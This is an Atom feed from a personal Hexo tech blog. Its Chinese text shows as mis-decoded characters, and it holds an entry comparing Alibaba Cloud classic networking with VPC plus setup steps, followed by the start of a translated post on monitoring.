<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chengyang&#39;s Blog</title>
  <subtitle>The mountain road twists and turns, but after all, toward the peak extension.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.yangcvo.me/"/>
  <updated>2017-04-19T06:50:50.000Z</updated>
  <id>http://blog.yangcvo.me/</id>
  
  <author>
    <name>yangc</name>
    <email>yangcvo@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œåŒºåˆ«å¦‚ä½•å®ç°æ–¹æ¡ˆï¼Ÿ</title>
    <link href="http://blog.yangcvo.me/2017/04/10/%E7%BD%91%E7%BB%9C/%E6%B7%B1%E5%BA%A6%E4%BA%86%E8%A7%A3%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E5%92%8C%E4%B8%93%E6%9C%89%E7%BD%91%E7%BB%9C%E5%8C%BA%E5%88%AB%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%A1%88%EF%BC%9F/"/>
    <id>http://blog.yangcvo.me/2017/04/10/ç½‘ç»œ/æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œåŒºåˆ«å¦‚ä½•å®ç°æ–¹æ¡ˆï¼Ÿ/</id>
    <published>2017-04-10T09:56:03.000Z</published>
    <updated>2017-04-19T06:50:50.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œåŒºåˆ«ï¼Ÿï¼š&quot;&gt;&lt;a href=&quot;#æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œåŒºåˆ«ï¼Ÿï¼š&quot; class=&quot;headerlink&quot; title=&quot;æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œåŒºåˆ«ï¼Ÿï¼š&quot;&gt;&lt;/a&gt;æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œåŒºåˆ«ï¼Ÿï¼š&lt;/h3&gt;&lt;p&gt;   å…¬å¸ä¸€å¼€å§‹è´­ä¹°é˜¿é‡Œäº‘æœåŠ¡å™¨å…¨éƒ¨é€‰æ‹©ç»å…¸ç½‘ç»œï¼Œæœºå™¨ç°åœ¨æ•°é‡è¾ƒå¤šï¼Œç°åœ¨è€ƒè™‘åˆ°å®‰å…¨é—®é¢˜å’Œç®¡ç†ä¸Šé—®é¢˜ï¼Œæ‰€ä»¥å…¬å¸å†³å®šåœ¨ç½‘ç»œä¸Šç®¡ç†è‡ªä¸»æ§åˆ¶ä»ç»å…¸ç½‘ç»œä¸Šè¿ç§»åˆ°ä¸“æœ‰ç½‘ç»œï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹æˆ‘ä¹Ÿäº†è§£äº†è¿™ä¸¤è€…çš„åŒºåˆ«è®°å½•å†™ä¸‹æ¥ï¼Œåé¢å†è®²å¦‚ä½•å®ç°è¿ç§»çš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åœ¨ç”¨æˆ·æäº¤è®¢å•è´­ä¹°é˜¿é‡Œäº‘ECSäº‘æœåŠ¡å™¨æ—¶ï¼Œä¼šé¢ä¸´æ€æ ·é€‰æ‹©ç½‘ç»œç±»å‹çš„çƒ¦æ¼ï¼Œé˜¿é‡Œäº‘æœåŠ¡å™¨å®šåˆ¶è´­ä¹°æ—¶ï¼Œç½‘ç»œç±»å‹é‡Œçš„ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œï¼ˆVPCï¼‰æ˜¯ä»€ä¹ˆå«ä¹‰ï¼Œè¯¥æ€æ ·é€‰æ‹©é€‚åˆè‡ªå·±çš„ç½‘ç»œç±»å‹å‘¢ï¼Ÿ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å…¶å®ï¼Œé˜¿é‡Œäº‘å®˜ç½‘å·²ç»ç»™å‡ºäº†å…³äºè¿™ä¸¤ç§ç½‘ç»œçš„ç®€å•ä»‹ç»ï¼š&lt;/p&gt;
&lt;p&gt;ç½‘ç»œç±»å‹ï¼šä»…æ˜¯ ECS äº§å“åŠŸèƒ½ä¸ŠåŒºåˆ†ï¼Œä¸è¿è¥å•†å…¬ç½‘æ¥å…¥ç½‘ç»œè´¨é‡æ— å…³ï¼Œä»»ä½•ç½‘ç»œç±»å‹çš„è¿è¥å•†æ¥å…¥å‡ä¸º BGP çº¿è·¯ï¼Œè¯·æ‚¨æ”¾å¿ƒä½¿ç”¨ï¼Œå¹¶æ ¹æ®è‡ªå·±éœ€è¦è¿›è¡Œé€‰æ‹©ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç»å…¸ç½‘ç»œï¼š IPåœ°å€ç”±é˜¿é‡Œäº‘ç»Ÿä¸€åˆ†é…ï¼Œé…ç½®ç®€ä¾¿ï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œé€‚åˆå¯¹æ“ä½œæ˜“ç”¨æ€§è¦æ±‚æ¯”è¾ƒé«˜ã€éœ€è¦å¿«é€Ÿä½¿ç”¨ ECS çš„ç”¨æˆ·ã€‚&lt;/li&gt;
&lt;li&gt;ä¸“æœ‰ç½‘ç»œï¼š æ˜¯æŒ‡é€»è¾‘éš”ç¦»çš„ç§æœ‰ç½‘ç»œï¼Œæ‚¨å¯ä»¥è‡ªå®šä¹‰ç½‘ç»œæ‹“æ‰‘å’Œ IP åœ°å€ï¼Œæ”¯æŒé€šè¿‡ä¸“çº¿è¿æ¥ã€‚é€‚åˆäºç†Ÿæ‚‰ç½‘ç»œç®¡ç†çš„ç”¨æˆ·ã€‚ &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åªä¸è¿‡ï¼Œè¿™ä¸ªä»‹ç»å¯¹äºå¾ˆå¤šäººæ¥è®²ï¼Œè¿˜æ˜¯çœ‹çš„äº‘é‡Œé›¾é‡Œï¼Œçœ‹å®Œäº†ä¹Ÿä¸çŸ¥é“è¯¥æ€ä¹ˆé€‰ã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®ï¼Œå¯ä»¥è¿™æ ·ç®€å•åœ°ç†è§£ï¼Œä»å…¬ç½‘ipæ¥è®²ï¼Œç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œæ²¡æœ‰åŒºåˆ«ï¼›&lt;br&gt;ä»å†…ç½‘ipæ¥è®²ï¼Œç»å…¸ç½‘ç»œæ˜¯DHIPï¼Œä¹Ÿå°±æ˜¯è‡ªåŠ¨åˆ†é…å±€åŸŸç½‘ipåœ°å€ï¼Œè€Œä¸“æœ‰ç½‘ç»œåˆ™æ˜¯æ‰‹å·¥åˆ†é…å±€åŸŸç½‘ipåœ°å€ï¼Œè¿™æ ·æ–¹ä¾¿æœ‰å¤šå°äº‘æœåŠ¡å™¨çš„ç”¨æˆ·è‡ªè¡Œå®šä¹‰å†…ç½‘ipç»“æ„ã€‚æ‰€ä»¥ï¼Œå¦‚æœç”¨æˆ·åªæœ‰ä¸€å°æœåŠ¡å™¨ï¼Œæˆ–è€…æœ‰å¤šå°æœåŠ¡å™¨ä½†ä¸éœ€è¦è¿›è¡Œå†…ç½‘äº’è”ï¼Œé‚£ä¹ˆè¿™ä¸¤ç§ç½‘ç»œéƒ½å¯ä»¥é€‰æ‹©çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä½†ä»å®åŠ¡ä¸Šè®²ï¼Œå› ä¸ºç»å…¸ç½‘ç»œæ˜¯é˜¿é‡Œäº‘è‡ªåŠ¨åˆ†é…çš„ipåœ°å€ï¼Œæœ‰ä¸€å®šçš„è§„å¾‹æ€§ï¼Œé‚£ä¹ˆé»‘å®¢ä¹Ÿå°±å¯ä»¥åˆ©ç”¨å†…ç½‘ipè¿›è¡Œå±€åŸŸç½‘æ”»å‡»ï¼Œè™½ç„¶åœ¨é˜¿é‡Œäº‘çš„å®‰å…¨ä½“ç³»ä¸‹æœ‰äº›éš¾åº¦ï¼Œä½†äº‹å®ä¹Ÿè¯æ˜äº†æœ‰è¢«æ”»å‡»çš„å¯èƒ½æ€§ã€‚è€Œä¸“æœ‰ç½‘ç»œå› ä¸ºæ˜¯è‡ªå®šä¹‰å±€åŸŸç½‘ipï¼Œé‚£ä¹ˆé»‘å®¢å°±æ²¡é‚£ä¹ˆå®¹æ˜“è¿›å…¥ç”¨æˆ·çš„å†…ç½‘è¿›è¡Œæ”»å‡»äº†ã€‚&lt;/p&gt;
&lt;h3 id=&quot;é‚£ä¹ˆä¸ºä»€ä¹ˆè¦æœ‰VPCå‘¢ï¼š&quot;&gt;&lt;a href=&quot;#é‚£ä¹ˆä¸ºä»€ä¹ˆè¦æœ‰VPCå‘¢ï¼š&quot; class=&quot;headerlink&quot; title=&quot;é‚£ä¹ˆä¸ºä»€ä¹ˆè¦æœ‰VPCå‘¢ï¼š&quot;&gt;&lt;/a&gt;é‚£ä¹ˆä¸ºä»€ä¹ˆè¦æœ‰VPCå‘¢ï¼š&lt;/h3&gt;&lt;p&gt;åœ¨vpcä¹‹å‰çš„ç½‘ç»œç±»å‹å°±å«ç»å…¸ç½‘ç»œï¼ŒVPCçš„ä¸»è¦ä½œç”¨ä¸ºäº†è§£å†³ç”¨æˆ·åœ¨&lt;code&gt;äº‘ç«¯çš„å®‰å…¨éš”ç¦»&lt;/code&gt;é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘å»ºåœ¨ä¸“æœ‰ç½‘ç»œé‡Œçš„å®¶ï¼Œå…¶ä»–äººåˆ°æˆ‘å®¶é»˜è®¤æ˜¯æ²¡æœ‰è·¯çš„ã€‚è€Œå»ºåœ¨ç»å…¸ç½‘ç»œé‡Œçš„å®¶ï¼Œå…¶ä»–äººåˆ°æˆ‘å®¶æ˜¯æœ‰è·¯çš„ï¼Œåªä¸è¿‡è·¯ä¸Šè¢«å¾ˆå¤šè†æ£˜æŒ¡ä½äº†ï¼Œæ‰€ä»¥ç»å…¸ç½‘ç»œå­˜åœ¨è¢«æ”»å‡»çš„å¯èƒ½æ€§ã€‚å½“ç„¶VPCè¿˜æœ‰å¾ˆå¤šå…¶ä»–å¥½å¤„ï¼Œæ¯”å¦‚ç½‘ç»œç®¡ç†æ›´çµæ´»ã€‚&lt;/p&gt;
&lt;p&gt;ä¸“æœ‰ç½‘ç»œå¤©ç”Ÿæ˜¯&lt;code&gt;éš”ç¦»çš„å®‰å…¨ç½‘ç»œ&lt;/code&gt;ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œåˆ«äººä¸èƒ½é€šè¿‡&lt;code&gt;ç§ç½‘è®¿é—®ç”¨æˆ·VPC&lt;/code&gt;ï¼Œç”¨æˆ·çš„VPCä¹Ÿä¸èƒ½é€šè¿‡ç§ç½‘è®¿é—®åˆ«äººã€‚è¿™é‡Œçš„åˆ«äººåŒ…æ‹¬ï¼šå…¶ä»–VPCå’Œç»å…¸ç½‘ç»œã€‚&lt;/p&gt;
&lt;p&gt;å‰é¢ä»‹ç»åˆ°ä¸“æœ‰ç½‘ç»œé€‚åˆç²¾é€šç½‘ç»œç®¡ç†çš„ç”¨æˆ·ï¼Œå®šåˆ¶å‹å¯æ‰©å±•å‹æ›´å¼ºï¼Œé‚£ä¹ˆç”¨æˆ·åˆ©ç”¨VPCå¯ä»¥åšäº›ä»€ä¹ˆå‘¢ï¼Ÿ&lt;/p&gt;
&lt;h5 id=&quot;IPè‡ªä¸»é€‰æ‹©&quot;&gt;&lt;a href=&quot;#IPè‡ªä¸»é€‰æ‹©&quot; class=&quot;headerlink&quot; title=&quot;IPè‡ªä¸»é€‰æ‹©&quot;&gt;&lt;/a&gt;IPè‡ªä¸»é€‰æ‹©&lt;/h5&gt;&lt;p&gt;ç›®å‰ï¼Œé˜¿é‡Œäº‘VPCæä¾›çš„IPåœ°å€æœ‰&lt;code&gt;192.168.0.0/16ï¼Œ172.16.0.0/12å’Œ10.0.0.0/8&lt;/code&gt;ã€‚ç”¨æˆ·å¯ä»¥é€‰æ‹©ä¸€æ®µIPåœ°å€æ¥è¯†åˆ«äº‘äº§å“ï¼ŒåŒæ—¶å¯ä»¥æŠŠIPåœ°å€æ‹†åˆ†æˆå¾ˆå¤šå­ç½‘ç»™ä¸åŒçš„åº”ç”¨ä½¿ç”¨ï¼Œèƒ½å¤Ÿåšåˆ°å¾ˆå¥½çš„ç½‘ç»œç®¡ç†ã€‚&lt;/p&gt;
&lt;h5 id=&quot;å®‰å…¨è‡ªä¸»å¯æ§&quot;&gt;&lt;a href=&quot;#å®‰å…¨è‡ªä¸»å¯æ§&quot; class=&quot;headerlink&quot; title=&quot;å®‰å…¨è‡ªä¸»å¯æ§&quot;&gt;&lt;/a&gt;å®‰å…¨è‡ªä¸»å¯æ§&lt;/h5&gt;&lt;p&gt;ä¸“æœ‰ç½‘ç»œé‡Œæ²¡ç»è¿‡æˆæƒä»»ä½•å¤–éƒ¨è®¿é—®éƒ½æ˜¯è¢«ç¦æ­¢çš„ç½‘ç»œå†…çš„æˆå‘˜ï¼ˆå¦‚ECSï¼‰é»˜è®¤ä¹Ÿä¸èƒ½éšä¾¿è®¿é—®å…¬ç½‘æˆ–è€…å…¶ä»–ä¸“æœ‰ç½‘ç»œã€‚æˆå‘˜ä¹‹é—´ï¼ˆå¦‚ECSï¼‰é»˜è®¤å¯ä»¥é€šä¿¡ï¼Œä½†ç®¡ç†å‘˜ä¹Ÿå¯ä»¥å¯¹æˆå‘˜çš„é€šä¿¡è¿›è¡Œç®¡åˆ¶ï¼ˆé€šè¿‡å®‰å…¨ç»„ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;å®ç°è·¯ç”±çš„è‡ªå®šä¹‰è§„åˆ™&lt;br&gt;å®ç°VPCå†…çš„è·¯ç”±æ§åˆ¶&lt;/p&gt;
&lt;h5 id=&quot;åŒå¯ç”¨åŒºï¼ˆæœºæˆ¿ï¼‰å†—ä½™å¤‡ä»½&quot;&gt;&lt;a href=&quot;#åŒå¯ç”¨åŒºï¼ˆæœºæˆ¿ï¼‰å†—ä½™å¤‡ä»½&quot; class=&quot;headerlink&quot; title=&quot;åŒå¯ç”¨åŒºï¼ˆæœºæˆ¿ï¼‰å†—ä½™å¤‡ä»½&quot;&gt;&lt;/a&gt;åŒå¯ç”¨åŒºï¼ˆæœºæˆ¿ï¼‰å†—ä½™å¤‡ä»½&lt;/h5&gt;&lt;p&gt;æŠŠäº‘äº§å“æ”¾ç½®åœ¨ä¸åŒçš„å¯ç”¨åŒºï¼Œè¿™æ ·ä¸‡ä¸€ä¸€ä¸ªå¯ç”¨åŒºï¼ˆæœºæˆ¿ï¼‰å‡ºç°é—®é¢˜ï¼Œå¦å¤–ä¸€ä¸ªå¯ç”¨åŒºï¼ˆæœºæˆ¿ï¼‰è¿˜å¯ä»¥ç»§ç»­æœåŠ¡ã€‚&lt;/p&gt;
&lt;h5 id=&quot;å®ç°å¤šä¸ªäº‘ä¸Šå¤šä¸ªVPCä¹‹é—´çš„è®¿é—®&quot;&gt;&lt;a href=&quot;#å®ç°å¤šä¸ªäº‘ä¸Šå¤šä¸ªVPCä¹‹é—´çš„è®¿é—®&quot; class=&quot;headerlink&quot; title=&quot;å®ç°å¤šä¸ªäº‘ä¸Šå¤šä¸ªVPCä¹‹é—´çš„è®¿é—®&quot;&gt;&lt;/a&gt;å®ç°å¤šä¸ªäº‘ä¸Šå¤šä¸ªVPCä¹‹é—´çš„è®¿é—®&lt;/h5&gt;&lt;p&gt;ä¸ºäº†å®‰å…¨ï¼Œç”¨æˆ·è¦å°†æµ‹è¯•ä¸šåŠ¡å’Œç”Ÿäº§ä¸šåŠ¡åˆ†å¼€ï¼Œå› æ­¤å¯ä»¥åœ¨äº‘ä¸Šå»ºç«‹ä¸¤ä¸ªVPCï¼ŒA VPC è´Ÿè´£ç”Ÿäº§ä¸šåŠ¡ï¼ŒB VPCè´Ÿè´£æµ‹è¯•ä¸šåŠ¡ï¼Œä¸¤ä¸ªPVCä¹‹é—´é»˜è®¤ä¸èƒ½é€šä¿¡ã€‚å¦‚æœA VPC è´Ÿè´£ç”Ÿäº§ä¸šåŠ¡ï¼Œä¼˜å…ˆçº§é«˜ï¼Œéœ€è¦ç»å¸¸è®¿é—®B VPCï¼Œä½†åä¹‹åˆ™ä¸è¡Œï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä½¿ç”¨é«˜é€Ÿé€šé“æŠŠA VPC å•å‘è¿åˆ°B VPC å°±å¯ä»¥äº†ã€‚&lt;/p&gt;
&lt;h5 id=&quot;å®ç°äº‘ä¸ŠVPCå’Œäº‘ä¸‹IDC&quot;&gt;&lt;a href=&quot;#å®ç°äº‘ä¸ŠVPCå’Œäº‘ä¸‹IDC&quot; class=&quot;headerlink&quot; title=&quot;å®ç°äº‘ä¸ŠVPCå’Œäº‘ä¸‹IDC&quot;&gt;&lt;/a&gt;å®ç°äº‘ä¸ŠVPCå’Œäº‘ä¸‹IDC&lt;/h5&gt;&lt;p&gt;é™¤äº†äº‘ä¸ŠVPCï¼Œç”¨æˆ·åœ¨äº‘ä¸‹è‡ªå·±çš„æœºæˆ¿è¿˜æœ‰å¾ˆå¤šæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é«˜é€Ÿé€šé“æŠŠäº‘ä¸ŠVPCå’Œäº‘ä¸‹æœºæˆ¿è¿èµ·æ¥ã€‚è¿™å°±æ˜¯ç°åœ¨æµè¡Œçš„æ··åˆäº‘ã€‚&lt;/p&gt;
&lt;h3 id=&quot;å°ç»“&quot;&gt;&lt;a href=&quot;#å°ç»“&quot; class=&quot;headerlink&quot; title=&quot;å°ç»“&quot;&gt;&lt;/a&gt;å°ç»“&lt;/h3&gt;&lt;p&gt;æ‰€ä»¥ï¼Œå¦‚æœæ‚¨å°±åªæœ‰ä¸€å°æœåŠ¡å™¨ï¼Œæˆ–è€…å¤šå°æœåŠ¡å™¨ä¹‹é—´ä¸éœ€è¦å†…ç½‘äº’è”ï¼Œé‚£ä¹ˆæ€æ ·é€‰æ‹©éƒ½å¯ä»¥ï¼Œä¸ªäººå»ºè®®é€‰æ‹©ä¸“æœ‰ç½‘ç»œï¼ŒåæœŸç®¡ç†æ›´ä¸ºç®€å•ã€‚&lt;br&gt;æœ‰å†…ç½‘äº’è”éœ€æ±‚ï¼Œä¸éœ€è¦è‡ªå®šä¹‰ç½‘ç»œç»“æ„ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ç»å…¸ç½‘ç»œã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä¼˜å…ˆæ¨èå®¢æˆ·ä½¿ç”¨VPCç½‘ç»œç¯å¢ƒæ¥éƒ¨ç½²åº”ç”¨ç³»ç»Ÿï¼ŒVPCä¸‹çš„ç½‘ç»œç¯å¢ƒä¼šæ›´çµæ´»ï¼Œå®‰å…¨æ›´åŠ æœ‰ä¿è¯ã€‚&lt;/p&gt;
&lt;h3 id=&quot;å®ç°æ–¹æ¡ˆ&quot;&gt;&lt;a href=&quot;#å®ç°æ–¹æ¡ˆ&quot; class=&quot;headerlink&quot; title=&quot;å®ç°æ–¹æ¡ˆ&quot;&gt;&lt;/a&gt;å®ç°æ–¹æ¡ˆ&lt;/h3&gt;&lt;p&gt;åŸºç¡€æµç¨‹ç¬¬ä¸€æ­¥ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åœ¨é˜¿é‡Œäº‘äº§å“æœåŠ¡-ä¸“æœ‰ç½‘ç»œVPCç”³è¯·å¼€é€š-åœ¨ä¸“æœ‰ç½‘ç»œVPCä¸Šé¢é€‰æ‹©ä¸“æœ‰ç½‘ç»œ-åˆ›å»ºä¸“æœ‰ç½‘ç»œã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åˆ›å»ºé€‰æ‹©è‡ªå·±è§„å®šä¸‹ä¸€ä¸ªç½‘æ®µï¼Œæä¾›çš„IPåœ°å€æœ‰&lt;code&gt;192.168.0.0/16ï¼Œ172.16.0.0/12å’Œ10.0.0.0/8&lt;/code&gt;  è¿™é‡Œæˆ‘é€‰æ‹©192.168.0.0/16 åˆ›å»ºå®Œæˆç‚¹å‡»ç®¡ç†ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ä¸“æœ‰ç½‘ç»œ-ç®¡ç†-æŸ¥çœ‹è·¯ç”±å™¨å¯ä»¥çœ‹åˆ°å¸®ä½ ç”Ÿæˆå‡ºæ¥ä¸¤ä¸ªè·¯ç”±å™¨è¡¨ï¼Œåˆ†åˆ«ç½‘æ®µï¼š192.168.1.0/24 100.64.0.0/10æ˜¾ç¤ºå¯ç”¨ã€‚&lt;br&gt;ä¸“æœ‰ç½‘ç»œ-ç®¡ç†-æŸ¥çœ‹äº¤æ¢æœº-é€‰æ‹©åˆ›å»ºäº¤æ¢æœº-å¡«å†™äº¤æ¢æœºåç§°ï¼ˆhd_Switch_01ï¼‰-é€‰æ‹©åœ°åŒº-é€‰æ‹©ç½‘æ®µå°±å¯ä»¥äº†,è¿™é‡Œæ˜¾ç¤º252ç§æœ‰IPåœ°å€å¯ç”¨ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä¸“æœ‰ç½‘ç»œ-ç®¡ç†-äº¤æ¢æœº-ç‚¹å‡»æ“ä½œåˆ›å»ºå®ä¾‹-åˆ†åˆ«æœ‰ï¼šåˆ›å»ºECSå®ä¾‹,åˆ›å»ºRDSå®ä¾‹,åˆ›å»ºSLBå®ä¾‹ã€‚-è¿™é‡Œä¼šè‡ªåŠ¨è·³è½¬åˆ°è‡ªåŠ¨ä¹‰-é€‰æ‹©åœ°åŸŸ-é€‰æ‹©ä¸“æœ‰ç½‘ç»œ-é€‰æ‹©å¯¹åº”çš„è·¯ç”±å™¨IDå’Œäº¤æ¢æœºIDã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å®æ–½æ–¹æ¡ˆå›¾æ™šç‚¹æ›´æ–°ç”»å‡ºã€‚&lt;/p&gt;
&lt;p&gt;æ¶æ„è§£è¯»ï¼šæ‚¨å¯ä»¥åœ¨é˜¿é‡Œäº‘ä¸Šåˆ›å»ºä¸€ä¸ªä¸“æœ‰ç½‘ç»œï¼Œå’Œå…¶ä»–ç§Ÿæˆ·çš„ç½‘ç»œå®Œå…¨éš”ç¦»ã€‚æ‚¨å¯ä»¥å®Œå…¨æŒæ§è‡ªå·±çš„è™šæ‹Ÿç½‘ç»œï¼Œä¾‹å¦‚é€‰æ‹©è‡ªå·±çš„ IP åœ°å€èŒƒå›´ã€åˆ’åˆ†ç½‘æ®µã€é…ç½®è·¯ç”±è¡¨å’Œç½‘å…³ç­‰ï¼Œä»è€Œå®ç°å®‰å…¨è€Œè½»æ¾çš„èµ„æºè®¿é—®å’Œåº”ç”¨ç¨‹åºè®¿é—®ã€‚æ­¤å¤–ï¼Œæ‚¨ä¹Ÿå¯ä»¥é€šè¿‡ä¸“çº¿æˆ– VPN ç­‰è¿æ¥æ–¹å¼å°†æ‚¨çš„ä¸“æœ‰ç½‘ç»œä¸ä¼ ç»Ÿæ•°æ®ä¸­å¿ƒç›¸è¿ï¼Œå½¢æˆä¸€ä¸ªæŒ‰éœ€å®šåˆ¶çš„ç½‘ç»œç¯å¢ƒï¼Œå®ç°åº”ç”¨çš„å¹³æ»‘è¿ç§»ä¸Šäº‘å’Œå¯¹æ•°æ®ä¸­å¿ƒçš„æ‰©å±•,ä½¿ç”¨VPCã€RDSã€ECSæ­å»ºäº‘ä¸Šä¸šåŠ¡ç³»ç»Ÿï¼Œæ ¸å¿ƒæ•°æ®æ”¾ç½®åœ¨äº‘ä¸‹è‡ªå»ºæ•°æ®ä¸­å¿ƒï¼Œä½¿ç”¨é«˜é€Ÿé€šé“ä¸“çº¿æ¥å…¥ä¿è¯äº‘ä¸Šæ•°æ®å¿«é€ŸåŒæ­¥ï¼Œå®ç°äº‘ä¸Šäº‘ä¸‹æ•°æ®äº’é€šï¼Œæ­å»ºä¸€ä¸ªæ··åˆäº‘ä½¿ç”¨ç¯å¢ƒã€‚&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œåŒºåˆ«ï¼Ÿï¼š&quot;&gt;&lt;a href=&quot;#æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œåŒºåˆ«ï¼Ÿï¼š&quot; class=&quot;headerlink&quot; title=&quot;æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰ç½‘ç»œåŒºåˆ«ï¼Ÿï¼š&quot;&gt;&lt;/a&gt;æ·±åº¦äº†è§£é˜¿é‡Œäº‘æœåŠ¡å™¨ç»å…¸ç½‘ç»œå’Œä¸“æœ‰
    
    </summary>
    
      <category term="NetWork" scheme="http://blog.yangcvo.me/categories/NetWork/"/>
    
    
      <category term="NetWork" scheme="http://blog.yangcvo.me/tags/NetWork/"/>
    
  </entry>
  
  <entry>
    <title>ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ</title>
    <link href="http://blog.yangcvo.me/2017/04/05/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E7%9B%91%E6%8E%A7%E4%B8%8D%E5%8F%AA%E6%98%AF%E4%B8%BA%E4%BA%86%E5%A4%84%E7%90%86%E6%95%85%E9%9A%9C/"/>
    <id>http://blog.yangcvo.me/2017/04/05/è¿ç»´ç¬”è®°/ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ/</id>
    <published>2017-04-05T03:33:17.000Z</published>
    <updated>2017-04-17T10:16:56.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ&quot;&gt;&lt;a href=&quot;#ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ&quot; class=&quot;headerlink&quot; title=&quot;ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ&quot;&gt;&lt;/a&gt;ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ&lt;/h3&gt;&lt;p&gt;æœ‰ä¸€ç§æ™®éçš„æƒ³æ³•è®¤ä¸ºç›‘æ§åªæ˜¯åœ¨ç³»ç»Ÿå‡ºé”™çš„æ—¶å€™èƒ½å¤Ÿå‘å‡ºæŠ¥è­¦ï¼Œæˆ‘ä»¬ä¸€ç›´ç›¸ä¿¡ï¼Œç›‘æ§ç³»ç»Ÿçš„æ–¹æ–¹é¢é¢ç»™äºˆæˆ‘ä»¬æ´å¯Ÿä¸šåŠ¡å†…éƒ¨æœºåˆ¶çš„èƒ½åŠ›ï¼Œå¹¶é©±åŠ¨æˆ‘ä»¬åšå‡ºå†³ç­–ã€‚&lt;br&gt;ä¸åŒçš„äººæœ‰ä¸åŒçš„ç›‘æ§æ–¹å¼ï¼Œæ‰‹åŠ¨æŸ¥çœ‹æ—¥å¿—ï¼Œæ¥å—æŠ¥è­¦æˆ–è€…24x7å€¼å®ˆæŸ¥çœ‹å„ç§å›¾è¡¨ã€‚ä¸ç®¡ä½ ç”¨é‚£ç§æ–¹å¼ï¼Œæœ€é‡è¦çš„æ˜¯åŠæ—¶æ”¶åˆ°æŠ¥é”™å’Œè­¦å‘Šã€‚&lt;br&gt;ä½†æ˜¯ç›‘æ§å…¶å®èƒ½åšçš„æ›´å¤šã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Prometheus-Overview.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç›‘æ§ä¸æ­¢ç”¨äºæ•…éšœæ—¶å€™å‘æŠ¥è­¦&lt;/p&gt;
